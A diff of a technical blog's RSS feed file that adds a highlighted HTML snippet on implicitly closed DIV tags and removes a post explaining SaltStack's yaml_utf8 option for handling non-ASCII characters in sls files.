+           &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;second&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;third&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end third--&amp;gt;&lt;/span&gt;
+           &lt;span class=&quot;nt&quot;&gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- implicit HTML - end second --&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end third? no, end foo --&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end second? no end foo&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- end foo&amp;#39;s parent&amp;#39;s parent if any --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Two &lt;code&gt;&amp;lt;/DIV&amp;gt;&lt;/code&gt; are &lt;strong&gt;impliclty added by the browser&lt;/strong&gt;, because you cannot close
@@ -3270,277 +4185,6 @@ Host: something.else
 </description>
 				<published>2014-09-19 00:00:00 +0200</published>
 				<link>http://regilero.github.io/english/security/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/</link>
-			</item>
-		
-			<item>
-				<title>SaltStack, Use more than ascii7 on sls files with yaml_utf8 option</title>
-				<description>&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;: &lt;em&gt;this option is only available on the &lt;code&gt;2014-01&lt;/code&gt; branch or the &lt;code&gt;develop&lt;/code&gt; branch, it&#39;s not yet available on the 0.17 releases branch.&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2&gt;Special characters?&lt;/h2&gt;
-
-&lt;p&gt;DevOps, developpers and sysadmins are usually nice people. They usually knows that most of the computer&#39;s tools they use are made by US people and that using nasty things such as spaces or, nastier, special characters like &lt;code&gt;é&lt;/code&gt; or &lt;code&gt;한&lt;/code&gt; may break their tools.&lt;/p&gt;
-
-&lt;p&gt;This is why most databases names will ends up as nice ascii7 names with spaces replaced by underscores, and most of the filesystem files follows the same rules.&lt;/p&gt;
-
-&lt;p&gt;But we are not anymore in the 60s. Every filesystem allows for utf-8 in file names, even the databases -- on a next post we&#39;ll show how salt mysql module has been improved to allow almost any character combination --. So salt-stack should support this fact.&lt;/p&gt;
-
-&lt;p&gt;But you may wonder why your salt-stack installation should support &#39;strange&#39; characters?
-You should take care of that because you usually provide states that you have tested with very simple hello-world level tests. And as a nice and polite computer guy, you did not add any nasty characters in your tests.
-And your sls files may contain jinja variables, which may be used with data coming from external sources. You may even have a full PaaS or SaaS system running. And sooner or later you will have a user that will feed an input field with something like a company name. This company name will contain spaces and maybe Korean characters... This user entry will maybe end up in a configuration file&#39;s name, in a database&#39;s name, in a managed file&#39;s content. Chances are great that some of &lt;strong&gt;theses strange characters will end up somewhere in your salt&#39;s sls files&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;The &lt;a href=&quot;http://docs.saltstack.com/ref/configuration/master.html#yaml-utf8&quot;&gt;new yaml_utf8 option&lt;/a&gt; should be enabled on your salt-stack installation to manage these cases. This is not activated by default, it&#39;s a new option, and is waiting for some positive and negative feedbacks (use &lt;a href=&quot;https://github.com/saltstack/salt/pull/9053&quot;&gt;this github pull request&lt;/a&gt; for example, or make new issues). So feel free to experiment.&lt;/p&gt;
-
-&lt;p&gt;Let&#39;s see why you need it and what this option is really doing.&lt;/p&gt;
-
-&lt;h2&gt;See it in action&lt;/h2&gt;
-
-&lt;p&gt;What happens if my yaml sls file contains some utf-8 characters? Well, bad things :-).&lt;/p&gt;
-
-&lt;p&gt;Let&#39;s try it. We&#39;ll make a very simple state, doing some echo, and we&#39;ll do that in a &lt;code&gt;testchar.sls&lt;/code&gt; file on the salt tree root.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
-test-characters:
-  cmd.run:
-    - name: echo &quot;¿Me pones un café, por favor?&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You can see the python utf-8 markers on the top of the sls file, this makes sure that the characters in this sls file are valid utf-8 characters. Two characters here are not in ascii7 &lt;code&gt;¿&lt;/code&gt; and &lt;code&gt;é&lt;/code&gt;. Let&#39;s now run this single state:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testchar
-[ERROR   ] An un-handled exception was caught by salt&#39;s global exception handler:
-UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode character u&#39;\xbf&#39; in position 6: ordinal not in range(128)
-Traceback (most recent call last):
-  File &quot;/usr/local/bin/salt-call&quot;, line 44, in &amp;lt;module&amp;gt;
-    sys.exit(salt.scripts.salt_call())
-  File &quot;/usr/local/salt/scripts.py&quot;, line 82, in salt_call
-    client.run()
-  File &quot;/usr/local/salt/cli/__init__.py&quot;, line 314, in run
-    caller.run()
-  File &quot;/usr/local/salt/cli/caller.py&quot;, line 142, in run
-    ret = self.call()
-  File &quot;/usr/local/salt/cli/caller.py&quot;, line 80, in call
-    ret[&#39;return&#39;] = func(*args, **kwargs)
-  File &quot;/usr/local/salt/modules/state.py&quot;, line 383, in sls
-    ret = st_.state.call_high(high_)
-  File &quot;/usr/local/salt/state.py&quot;, line 1701, in call_high
-    chunks = self.compile_high_data(high)
-  File &quot;/usr/local/salt/state.py&quot;, line 976, in compile_high_data
-    chunks = self.order_chunks(chunks)
-  File &quot;/usr/local/salt/state.py&quot;, line 920, in order_chunks
-    chunks.sort(key=lambda k: (k[&#39;order&#39;], &#39;{0[state]}{0[name]}{0[fun]}&#39;.format(k)))
-  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
-    chunks.sort(key=lambda k: (k[&#39;order&#39;], &#39;{0[state]}{0[name]}{0[fun]}&#39;.format(k)))
-UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode character u&#39;\xbf&#39; in position 6: ordinal not in range(128)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ouch.&lt;/p&gt;
-
-&lt;p&gt;Now let&#39;s find the &lt;code&gt;yaml_utf8&lt;/code&gt; option in your master salt configuration file, for me it was in &lt;code&gt;/etc/salt/master.d/00_global.conf&lt;/code&gt;, and set it to True. Then restart the master and test again:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#$ service salt-master restart
-salt-master stop/waiting
-salt-master start/running, process 5471
-#$ salt-call state.sls testchar
-local:
-----------
-          ID: test-characters
-    Function: cmd.run
-        Name: echo &quot;¿Me pones un café, por favor?&quot;
-      Result: True
-     Comment: Command &quot;echo &quot;¿Me pones un café, por favor?&quot;&quot; run
-     Changes:   
-              ----------
-              pid:
-                  5053
-              retcode:
-                  0
-              stderr:
-
-              stdout:
-                  ¿Me pones un café, por favor?
-
-Summary
-------------
-Succeeded: 1
-Failed:    0
-------------
-Total:     1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great.&lt;/p&gt;
-
-&lt;p&gt;Note that the main problem here, in the first example, was that special characters were used on the state &lt;strong&gt;name&lt;/strong&gt;. But it could also happen with harmless attributes. Let&#39;s try with a &lt;strong&gt;text&lt;/strong&gt; attribute, and without the &lt;code&gt;yaml_utf8&lt;/code&gt; option set:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
-test-characters1:
-  file.touch:
-    - name: /tmp/foobar
-test-characters2:
-  file.append:
-    - name: /tmp/foobar
-    - text: &quot;¿Me pones un café, por favor?&quot;
-    - require:
-      - file: test-characters1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It will also fail:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testch
-local:
-----------
-          ID: test-characters1
-    Function: file.touch
-        Name: /tmp/foobar
-      Result: True
-     Comment: Updated times on file /tmp/foobar
-     Changes:   
-----------
-          ID: test-characters2
-    Function: file.append
-        Name: /tmp/foobar
-      Result: False
-     Comment: An exception occurred in this state: Traceback (most recent call last):
-                File &quot;/usr/local/salt/state.py&quot;, line 1370, in call
-                  **cdata[&#39;kwargs&#39;])
-                File &quot;/usr/local/salt/states/file.py&quot;, line 2519, in append
-                  name, salt.utils.build_whitespace_split_regex(chunk)):
-                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 772, in     build_whitespace_split_regex
-                  parts = [re.escape(s) for s in __build_parts(line)]
-                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 761, in     __build_parts
-                  lexer = shlex.shlex(text)
-                File &quot;/usr/lib/python2.7/shlex.py&quot;, line 25, in __init__
-                  instream = StringIO(instream)
-              UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode character u&#39;\xbf&#39; in position 0: ordinal not in range(128)
-     Changes:   
-
-Summary
-------------
-Succeeded: 1
-Failed:    1
-------------
-Total:     2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;But here, at least, you have a catched exception.&lt;/p&gt;
-
-&lt;p&gt;Obviously, after using the &lt;code&gt;yaml_utf8&lt;/code&gt; option this state will work.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;local:
-----------
-          ID: test-characters1
-    Function: file.touch
-        Name: /tmp/foobar
-      Result: True
-     Comment: Updated times on file /tmp/foobar
-     Changes:   
-----------
-          ID: test-characters2
-    Function: file.append
-        Name: /tmp/foobar
-      Result: True
-     Comment: Appended 1 lines
-     Changes:   
-              ----------
-              diff:
-                  --- 
-                  +++ 
-                  @@ -0,0 +1 @@
-                  +¿Me pones un café, por favor?
-Summary
-------------
-Succeeded: 2
-Failed:    0
-------------
-Total:     2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2&gt;What happened exactly?&lt;/h2&gt;
-
-&lt;p&gt;If you want to understand this better I&#39;ll give some details. You do not need to understand the details, but it could be useful, especially if you are american (or part of the subset of humanity using pounds, miles and ascii7).&lt;/p&gt;
-
-&lt;p&gt;The error was there:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
-    chunks.sort(key=lambda k: (k[&#39;order&#39;], &#39;{0[state]}{0[name]}{0[fun]}&#39;.format(k)))
-UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode character u&#39;\xbf&#39; in position 6: ordinal not in range(128)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Salt is ordering the states and the states&#39; name are used to do the sorting. Here we have special characters on these names and the sort method emits an uncatched exception.&lt;/p&gt;
-
-&lt;p&gt;A fix would be replacing &lt;code&gt;&#39;{0[state]}{0[name]}{0[fun]}&#39;&lt;/code&gt; with &lt;code&gt;u&#39;{0[state]}{0[name]}{0[fun]}&#39;&lt;/code&gt;. But you would need this sort of fix in a thousand places. You would have to fix pretty much every string in salt :-(&lt;/p&gt;
-
-&lt;p&gt;By default, with python 2.x, there are two types of string objects:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;str : the default string object, allow utf-8 encoded strings (a byte string)&lt;/li&gt;
-&lt;li&gt;unicode : an unicode string&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;An example is worth a thousand words:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#$ python
-&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
-&amp;gt;&amp;gt;&amp;gt; foo
-&#39;foo&#39;
-&amp;gt;&amp;gt;&amp;gt; type(foo)
-&amp;lt;type &#39;str&#39;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
-&amp;gt;&amp;gt;&amp;gt; bar
-&#39;\xe6\xba\x96&#39;
-&amp;gt;&amp;gt;&amp;gt; type(bar)
-&amp;lt;type &#39;str&#39;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; baz=u&quot;準&quot;
-&amp;gt;&amp;gt;&amp;gt; baz
-u&#39;\u6e96&#39;
-&amp;gt;&amp;gt;&amp;gt; type(baz)
-&amp;lt;type &#39;unicode&#39;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So the special character &lt;code&gt;準&lt;/code&gt; is &lt;code&gt;\xe6\xba\x96&lt;/code&gt; in utf-8 encoding and &lt;code&gt;\u6e96&lt;/code&gt; in unicode encoding. Unicode and utf-8 are not the same things. And by default string objects are utf-8 encoded strings.&lt;/p&gt;
-
-&lt;p&gt;The funny thing is that this is not the case in python 3.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#$ /usr/bin/python3.2
-&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
-&amp;gt;&amp;gt;&amp;gt; foo
-&#39;foo&#39;
-&amp;gt;&amp;gt;&amp;gt; type(foo)
-&amp;lt;class &#39;str&#39;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
-&amp;gt;&amp;gt;&amp;gt; bar
-&#39;準&#39;
-&amp;gt;&amp;gt;&amp;gt; type(bar)
-&amp;lt;class &#39;str&#39;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; baz=bar.encode(&#39;utf-8&#39;)
-&amp;gt;&amp;gt;&amp;gt; baz
-b&#39;\xe6\xba\x96&#39;
-&amp;gt;&amp;gt;&amp;gt; type(baz)
-&amp;lt;class &#39;bytes&#39;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In python3 the default string class will be unicode (as if you had prefixed all your python2 string with &lt;code&gt;u&lt;/code&gt;), and the old python default str type will be the byte string class. You will need to prefix with &lt;code&gt;b&lt;/code&gt; to get that sort of utf-8 encoded strings.&lt;/p&gt;
-
-&lt;p&gt;You can find a very detailled explanation on &lt;a href=&quot;http://docs.python.org/3.3/howto/unicode.html&quot;&gt;python&#39;s unicode documentation&lt;/a&gt; and on &lt;a href=&quot;http://wolfprojects.altervista.org/talks/unicode-and-python-3/&quot;&gt;this slide explaining the difference of string encoding in python2 and 3&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Talking about &lt;strong&gt;&lt;a href=&quot;http://www.saltstack.com/&quot;&gt;Salt-stack&lt;/a&gt;&lt;/strong&gt; we are working in a python2 world. And in pretty every string usage inside salt-stack default strings are used, so byte strings, allowing utf-8 encoding but not unicode. This should allow every special character, if they are well transformed to an utf-8 encoded string. If our special string is managed in this form:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&#39;\xc2\xbfMe pones un caf\xc3\xa9, por favor?&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Everything should be fine.&lt;/p&gt;
-
-&lt;p&gt;The problem comes from the sls yaml transcription. Salt works with low states, highstates, etc. This is generated from the sls files with a yaml transcription. And this task is made by a yaml library.&lt;/p&gt;
-
-&lt;p&gt;This &lt;strong&gt;yaml parser library&lt;/strong&gt; is python3-ready, and the result of the yaml parsing is always &lt;strong&gt;unicode strings&lt;/strong&gt; if special characters are encountered, not str default strings. So as soon as you have a special character in the sls salt receive unicode u&#39;foo&#39; strings while everything is made to handle utf-8 encoded strings. This yaml_utf8 option is there to ensure that after the yaml load is made, every unicode string is decoded to utf-8, you can see it in the code &lt;a href=&quot;https://github.com/saltstack/salt/blob/2014.1/salt/renderers/yaml.py#L70-92&quot;&gt;right here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-				<published>2014-02-05 00:00:00 +0100</published>
-				<link>http://regilero.github.io/english/saltstack/2014/02/05/saltstack-use-more-than-ascii7-on-sls-files-with-yaml_utf8-option/</link>
 			</item>
 		
 	</channel>
